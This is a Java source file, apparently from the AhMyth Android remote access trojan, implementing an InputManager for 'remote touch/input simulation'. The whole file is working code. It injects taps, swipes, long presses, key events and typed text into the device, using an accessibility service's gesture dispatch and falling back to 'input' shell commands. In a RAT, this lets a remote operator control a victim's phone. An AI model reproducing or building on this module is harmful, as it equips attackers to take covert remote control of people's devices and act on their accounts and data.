package ahmyth.mine.king.ahmyth;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.graphics.Path;
import android.os.Build;
import android.util.Log;

import org.json.JSONObject;

import java.io.DataOutputStream;

/**
 * InputManager handles remote touch/input simulation
 * Uses shell commands (non-root) or accessibility service for input injection
 */
public class InputManager {
    private static final String TAG = "InputManager";
    
    private Context context;
    private static AccessibilityService accessibilityService;
    private int screenWidth;
    private int screenHeight;
    
    public InputManager(Context context) {
        this.context = context;
        // Get actual screen dimensions for coordinate mapping
        android.util.DisplayMetrics metrics = context.getResources().getDisplayMetrics();
        this.screenWidth = metrics.widthPixels;
        this.screenHeight = metrics.heightPixels;
    }
    
    /**
     * Set accessibility service for gesture injection
     */
    public static void setAccessibilityService(AccessibilityService service) {
        accessibilityService = service;
    }
    
    /**
     * Simulate a tap at the given coordinates
     * Coordinates should be normalized (0-1) or actual pixels
     */
    public JSONObject tap(float x, float y, boolean normalized) {
        JSONObject result = new JSONObject();
        try {
            int actualX = normalized ? (int)(x * screenWidth) : (int)x;
            int actualY = normalized ? (int)(y * screenHeight) : (int)y;
            
            Log.d(TAG, "Tap at: " + actualX + ", " + actualY);
            
            boolean success = false;
            
            // Try accessibility service first (works without root)
            if (accessibilityService != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                success = performAccessibilityTap(actualX, actualY);
            }
            
            // Fallback to shell command
            if (!success) {
                success = performShellTap(actualX, actualY);
            }
            
            result.put("success", success);
            result.put("x", actualX);
            result.put("y", actualY);
            result.put("action", "tap");
            
        } catch (Exception e) {
            Log.e(TAG, "Error performing tap", e);
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (Exception ignored) {}
        }
        return result;
    }
    
    /**
     * Simulate a swipe gesture
     */
    public JSONObject swipe(float startX, float startY, float endX, float endY, int duration, boolean normalized) {
        JSONObject result = new JSONObject();
        try {
            int x1 = normalized ? (int)(startX * screenWidth) : (int)startX;
            int y1 = normalized ? (int)(startY * screenHeight) : (int)startY;
            int x2 = normalized ? (int)(endX * screenWidth) : (int)endX;
            int y2 = normalized ? (int)(endY * screenHeight) : (int)endY;
            
            Log.d(TAG, "Swipe from: " + x1 + "," + y1 + " to " + x2 + "," + y2);
            
            boolean success = false;
            
            // Try accessibility service first
            if (accessibilityService != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                success = performAccessibilitySwipe(x1, y1, x2, y2, duration);
            }
            
            // Fallback to shell command
            if (!success) {
                success = performShellSwipe(x1, y1, x2, y2, duration);
            }
            
            result.put("success", success);
            result.put("action", "swipe");
            result.put("startX", x1);
            result.put("startY", y1);
            result.put("endX", x2);
            result.put("endY", y2);
            
        } catch (Exception e) {
            Log.e(TAG, "Error performing swipe", e);
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (Exception ignored) {}
        }
        return result;
    }
    
    /**
     * Simulate a long press
     */
    public JSONObject longPress(float x, float y, int duration, boolean normalized) {
        JSONObject result = new JSONObject();
        try {
            int actualX = normalized ? (int)(x * screenWidth) : (int)x;
            int actualY = normalized ? (int)(y * screenHeight) : (int)y;
            
            Log.d(TAG, "Long press at: " + actualX + ", " + actualY + " for " + duration + "ms");
            
            boolean success = false;
            
            // Try accessibility service first
            if (accessibilityService != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                success = performAccessibilityLongPress(actualX, actualY, duration);
            }
            
            // Fallback to shell swipe with same start/end (simulates long press)
            if (!success) {
                success = performShellSwipe(actualX, actualY, actualX, actualY, duration);
            }
            
            result.put("success", success);
            result.put("x", actualX);
            result.put("y", actualY);
            result.put("action", "longPress");
            
        } catch (Exception e) {
            Log.e(TAG, "Error performing long press", e);
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (Exception ignored) {}
        }
        return result;
    }
    
    /**
     * Simulate key press (back, home, recents, etc)
     */
    public JSONObject keyPress(String key) {
        JSONObject result = new JSONObject();
        try {
            Log.d(TAG, "Key press: " + key);
            
            int keyCode;
            switch (key.toLowerCase()) {
                case "back":
                    keyCode = 4;
                    break;
                case "home":
                    keyCode = 3;
                    break;
                case "recents":
                case "menu":
                    keyCode = 187;
                    break;
                case "power":
                    keyCode = 26;
                    break;
                case "volumeup":
                    keyCode = 24;
                    break;
                case "volumedown":
                    keyCode = 25;
                    break;
                case "enter":
                    keyCode = 66;
                    break;
                default:
                    keyCode = Integer.parseInt(key);
            }
            
            boolean success = performShellKey(keyCode);
            
            result.put("success", success);
            result.put("key", key);
            result.put("keyCode", keyCode);
            result.put("action", "keyPress");
            
        } catch (Exception e) {
            Log.e(TAG, "Error performing key press", e);
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (Exception ignored) {}
        }
        return result;
    }
    
    /**
     * Input text
     */
    public JSONObject inputText(String text) {
        JSONObject result = new JSONObject();
        try {
            Log.d(TAG, "Input text: " + text);
            
            // Escape special characters for shell
            String escapedText = text.replace("\\", "\\\\")
                                    .replace("\"", "\\\"")
                                    .replace(" ", "%s")
                                    .replace("'", "\\'");
            
            boolean success = executeShellCommand("input text \"" + escapedText + "\"");
            
            result.put("success", success);
            result.put("text", text);
            result.put("action", "inputText");
            
        } catch (Exception e) {
            Log.e(TAG, "Error inputting text", e);
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (Exception ignored) {}
        }
        return result;
    }
    
    /**
     * Get screen dimensions for coordinate mapping
     */
    public JSONObject getScreenDimensions() {
        JSONObject result = new JSONObject();
        try {
            result.put("width", screenWidth);
            result.put("height", screenHeight);
            result.put("success", true);
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (Exception ignored) {}
        }
        return result;
    }
    
    // ============ Private Implementation Methods ============
    
    private boolean performAccessibilityTap(int x, int y) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
        if (accessibilityService == null) return false;
        
        try {
            Path path = new Path();
            path.moveTo(x, y);
            
            GestureDescription.StrokeDescription stroke = 
                new GestureDescription.StrokeDescription(path, 0, 50);
            
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(stroke);
            
            return accessibilityService.dispatchGesture(builder.build(), null, null);
        } catch (Exception e) {
            Log.e(TAG, "Accessibility tap failed", e);
            return false;
        }
    }
    
    private boolean performAccessibilitySwipe(int x1, int y1, int x2, int y2, int duration) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
        if (accessibilityService == null) return false;
        
        try {
            Path path = new Path();
            path.moveTo(x1, y1);
            path.lineTo(x2, y2);
            
            GestureDescription.StrokeDescription stroke = 
                new GestureDescription.StrokeDescription(path, 0, Math.max(100, duration));
            
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(stroke);
            
            return accessibilityService.dispatchGesture(builder.build(), null, null);
        } catch (Exception e) {
            Log.e(TAG, "Accessibility swipe failed", e);
            return false;
        }
    }
    
    private boolean performAccessibilityLongPress(int x, int y, int duration) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
        if (accessibilityService == null) return false;
        
        try {
            Path path = new Path();
            path.moveTo(x, y);
            
            GestureDescription.StrokeDescription stroke = 
                new GestureDescription.StrokeDescription(path, 0, Math.max(500, duration));
            
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(stroke);
            
            return accessibilityService.dispatchGesture(builder.build(), null, null);
        } catch (Exception e) {
            Log.e(TAG, "Accessibility long press failed", e);
            return false;
        }
    }
    
    private boolean performShellTap(int x, int y) {
        return executeShellCommand("input tap " + x + " " + y);
    }
    
    private boolean performShellSwipe(int x1, int y1, int x2, int y2, int duration) {
        return executeShellCommand("input swipe " + x1 + " " + y1 + " " + x2 + " " + y2 + " " + duration);
    }
    
    private boolean performShellKey(int keyCode) {
        return executeShellCommand("input keyevent " + keyCode);
    }
    
    private boolean executeShellCommand(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            int exitCode = process.waitFor();
            return exitCode == 0;
        } catch (Exception e) {
            Log.e(TAG, "Shell command failed: " + command, e);
            return false;
        }
    }
}

